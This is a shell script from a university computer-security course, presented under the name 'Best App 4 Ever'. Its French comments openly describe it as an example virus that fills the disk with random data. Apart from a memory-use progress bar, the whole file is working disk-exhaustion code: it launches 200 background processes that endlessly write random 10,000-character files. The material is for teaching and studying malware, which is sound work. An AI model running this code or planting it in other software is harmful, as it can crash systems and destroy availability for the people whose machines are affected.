#!/bin/sh

#############################################
########### Best App 4 Ever #################
#############################################

# Application développé dans le cadre du cours 8INF857 - Sécurité Informatique à l'UQAC
# Ce code est un exemple d'un virus malicieux qui a pour objectif de remplir votre disque d'information aléatoire juste pour saturé la mémoire.
# Ce code est un fragment d'un code qui sera décrit plus tard.



# Créer le répertoire dev si ce n'est pas déjà fait
mkdir -p dev

# Fonction pour afficher une barre de chargement globale basée sur l'utilisation de la mémoire
global_progress_bar() {
    while true; do
        # Obtenir le pourcentage d'utilisation de la mémoire
        used_percentage=$(free | grep Mem | awk '{print $3/$2 * 100.0}' | xargs printf "%.0f")

        # Afficher la barre de chargement
        bar_length=50  # Longueur de la barre de chargement en caractères
        num_hashes=$(( used_percentage * bar_length / 100 ))
        num_spaces=$(( bar_length - num_hashes ))

        # Construire la barre
        bar=$(printf "%0.s#" $(seq 1 $num_hashes))
        spaces=$(printf "%0.s " $(seq 1 $num_spaces))

        # Afficher la barre avec le pourcentage
        printf "\rProgress: [%-${bar_length}s] %d%%" "$bar$spaces" "$used_percentage"

        # Attendre 1 seconde avant la prochaine mise à jour
        sleep 1
    done
}


# Fonction à exécuter dans chaque processus
run_process() {
    while true; do
        # Générer un nom de fichier aléatoire (ex: une chaîne de 10 caractères)
        filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)

        # Générer un contenu aléatoire (ex: une chaîne de 50 caractères)
        content=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10000 | head -n 1)

        # Créer un fichier avec le nom généré et le contenu sans afficher la sortie
        echo "$content" > dev/"$filename.txt" 

        # Attendre 1 seconde pour le debug
        # sleep 1
    done
}

# Fonction de nettoyage lors de l'interruption
cleanup() {
    echo "\nArrêt des processus..."
    # Tuer tous les processus en arrière-plan
    kill 0
    exit
}

# on catch CTRL+C
trap cleanup SIGINT

# Nombre de processus à exécuter
num_processes=200  # Modifiez ceci pour le nombre souhaité de processus

# Démarrer plusieurs processus
i=1
while [ $i -le $num_processes ]; do
    run_process &  # Exécuter en arrière-plan
    i=$((i + 1))   # Incrémenter le compteur
done

# Démarrer la barre de chargement globale dans un processus en arrière-plan
global_progress_bar &

# Attendre que tous les processus en arrière-plan se terminent
wait
